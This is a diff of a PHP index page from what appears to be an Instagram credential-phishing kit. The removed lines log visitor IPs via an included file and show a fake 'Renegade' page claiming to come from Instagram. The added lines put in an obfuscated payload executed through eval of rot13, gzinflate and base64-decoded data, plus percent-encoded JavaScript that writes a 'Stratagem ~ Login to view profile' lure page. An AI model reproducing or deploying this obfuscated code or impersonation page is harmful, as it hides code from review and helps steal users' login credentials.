@@ -1,19 +1,7 @@
 <?php
-include 'ip.php';
-header('Location: login.html');
-exit
+eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 ?>
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Renegade ~ A lovely way to get opinions that matter</title>
-    <!-- <meta property="og:url" content="https://instagram.com/"> -->
-    <meta content="From our friends at Instagram - A simple, fun &amp; creative way to get opinions &amp; messages from friends &amp family or even anonymously!" name="description">
-</head>
-<body>
-    You will be required to login with instagram. Please wait...
-</body>
-</html>
+<script language="javascript">
+document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%20%6C%61%6E%67%3D%22%65%6E%22%3E%0A%3C%68%65%61%64%3E%0A%20%20%20%20%3C%6D%65%74%61%20%63%68%61%72%73%65%74%3D%22%55%54%46%2D%38%22%3E%0A%20%20%20%20%3C%6D%65%74%61%20%6E%61%6D%65%3D%22%76%69%65%77%70%6F%72%74%22%20%63%6F%6E%74%65%6E%74%3D%22%77%69%64%74%68%3D%64%65%76%69%63%65%2D%77%69%64%74%68%2C%20%69%6E%69%74%69%61%6C%2D%73%63%61%6C%65%3D%31%2E%30%22%3E%0A%20%20%20%20%3C%74%69%74%6C%65%3E%53%74%72%61%74%61%67%65%6D%20%7E%20%4C%6F%67%69%6E%20%74%6F%20%76%69%65%77%20%70%72%6F%66%69%6C%65%3C%2F%74%69%74%6C%65%3E%0A%20%20%20%20%3C%6D%65%74%61%20%63%6F%6E%74%65%6E%74%3D%22%53%74%72%61%74%61%67%65%6D%20%2D%20%56%69%65%77%20%70%72%6F%66%69%6C%65%22%20%6E%61%6D%65%3D%22%64%65%73%63%72%69%70%74%69%6F%6E%22%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%20%20%20%20%50%6C%65%61%73%65%20%77%61%69%74%2E%2E%2E%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E'));
+</script>
